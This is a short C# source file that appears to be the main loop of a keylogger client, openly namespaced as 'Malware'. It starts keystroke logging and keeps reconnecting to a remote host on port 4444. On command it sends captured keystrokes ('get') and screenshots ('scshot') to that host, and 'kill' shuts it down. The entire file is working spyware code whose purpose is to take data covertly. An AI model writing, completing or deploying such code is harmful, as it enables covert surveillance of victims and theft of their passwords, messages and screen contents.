using System.Net.Sockets;
using System.IO;
public class Program{
    public static void Main(String[] arg){
        var EXIT = 0;
        Malware.TcpKeylogger.startKeylog();
        __SOCKET__:
        var sock = new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
        sock.ReceiveTimeout = 20000; //Raise IOExecption
        _Connection_:
                try
                {
                    sock.Connect("192.168.125.128", 4444);
                }
                catch
                {

                }
                if (!sock.Connected)
                {
                    Thread.Sleep(2000);
                    goto _Connection_;
                }
        var ns = new NetworkStream(sock);
        var sr = new StreamReader(ns);
        string ? str="";
        try{
            while((str=sr.ReadLine())!=null){ // return null on connection closed

                
                if(str == "get"){
                    Malware.TcpKeylogger.SendKeylog(sock);
                }
                if(str == "kill"){
                    Malware.TcpKeylogger.stopKeylog();
                    EXIT = 1;
                }

                if(str == "scshot"){
                    Malware.TcpKeylogger.SendScreenShot(sock);
                }
                if (EXIT == 1)
                {
                    break;
                }
            }

            
        }
        catch(IOException ex){

        }
        sock.Close();
        if(EXIT!=1){
            goto __SOCKET__;
        }
    }
}